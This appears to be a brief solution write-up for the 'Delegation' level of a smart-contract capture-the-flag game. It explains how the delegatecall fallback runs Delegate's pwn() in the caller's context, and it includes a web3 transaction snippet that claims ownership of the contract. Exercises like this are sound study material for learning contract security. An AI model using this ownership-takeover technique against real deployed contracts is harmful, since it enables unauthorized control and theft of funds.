# 6. Delegation

Goal :

- claim ownership of the contract

Methodology :

delegatecall executes code using the context of the caller. Therefore, we can we can use the fallback function of Delegation to trigger pwn() in Delegate and become the owner of Delegation.

````
await contract.sendTransaction({
	from:player, 
	to:contract.address, 
	data:web3.eth.abi.encodeFunctionSignature("pwn()")
})

````



